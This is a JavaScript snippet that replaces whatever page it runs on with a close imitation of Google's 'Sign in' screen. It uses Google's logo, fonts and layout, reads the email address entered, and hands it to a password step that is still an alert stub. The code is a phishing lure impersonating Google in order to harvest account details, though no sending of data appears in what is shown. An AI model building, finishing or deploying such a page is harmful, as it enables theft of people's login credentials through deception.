(function() {
    'use strict';

    function loadGoogleFonts() {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = 'https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap';
        document.head.appendChild(link);
    }

    const styles = `
        <style>
            body { background-color: #202124; }
            .container {
                display: flex; flex-direction: column; align-items: center;
                justify-content: center; font-family: 'Roboto', Arial, sans-serif;
                color: #e8eaed; height: 100vh;
            }
            .login-box {
                background-color: #202124; padding: 48px 40px 36px;
                border: 1px solid #5f6368; border-radius: 8px;
                width: 368px; text-align: center;
            }
            .login-box img { height: 24px; margin-bottom: 16px; }
            .login-box h1 { font-size: 24px; font-weight: 400; margin: 0; }
            .login-box p { font-size: 16px; margin-top: 8px; }
            .input-container { position: relative; margin-top: 24px; }
            .input-field {
                background: none; border: 1px solid #5f6368; border-radius: 4px;
                width: calc(100% - 32px); padding: 13px 15px; font-size: 16px; color: #e8eaed;
            }
            .input-label {
                position: absolute; top: 14px; left: 16px; font-size: 16px;
                color: #9aa0a6; pointer-events: none; transition: all 0.2s ease;
            }
            /* --- ALIGNMENT FIX IS HERE --- */
            .input-field:focus + .input-label, .input-field:not(:placeholder-shown) + .input-label {
                top: -8px; left: 15px; font-size: 12px;
                background-color: #202124; padding: 0 4px; color: #8ab4f8;
            }
            .input-field:focus { border: 2px solid #8ab4f8; outline: none; padding: 12px 15px;}
            .link-btn {
                font-weight: 500; color: #8ab4f8; background: none; border: none;
                cursor: pointer; padding: 8px 0; font-size: 14px; text-align: left;
            }
            .info-text { font-size: 14px; color: #bdc1c6; text-align: left; margin-top: 32px; }
            .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
            .next-btn {
                background-color: #8ab4f8; color: #202124; border: none; border-radius: 4px;
                padding: 8px 24px; font-size: 14px; font-weight: 500; cursor: pointer;
            }
            .footer {
                width: 448px; display: flex; justify-content: space-between;
                padding: 20px 0; font-size: 12px; color: #9aa0a6;
            }
            .footer-links a { color: #9aa0a6; text-decoration: none; margin-left: 16px; }
            select { background: none; border: none; color: #9aa0a6; }
        </style>
    `;

    function showEmailScreen() {
        document.body.innerHTML = `
            ${styles}
            <div class="container">
                <div class="login-box">
                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_74x24dp.png" alt="Google">
                    <h1>Sign in</h1>
                    <p>Use your Google Account</p>
                    <div class="input-container">
                        <input type='email' id='g-email' class='input-field' placeholder=" "/>
                        <label class="input-label" for="g-email">Email or phone</label>
                    </div>
                    <div style="text-align: left; margin-top: 10px;">
                        <button type="button" class="link-btn">Forgot email?</button>
                    </div>
                    <p class="info-text">Not your computer? Use a private Browse window to sign in. <a href="#" class="link-btn" style="padding:0;">Learn more</a></p>
                    <div class="actions">
                        <button type="button" class="link-btn">Create account</button>
                        <button type='button' id="next-btn" class="next-btn">Next</button>
                    </div>
                </div>
                <div class="footer">
                    <select><option>English (United States)</option></select>
                    <div class="footer-links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
                </div>
            </div>`;

        document.getElementById('next-btn').addEventListener('click', () => {
            const email = document.getElementById('g-email').value;
            if (email) {
                showPasswordScreen(email);
            }
        });
    }
    
    function showPasswordScreen(email) {
        alert(`Next step: Show password screen for ${email}`);
    }

    loadGoogleFonts();
    showEmailScreen();
})();
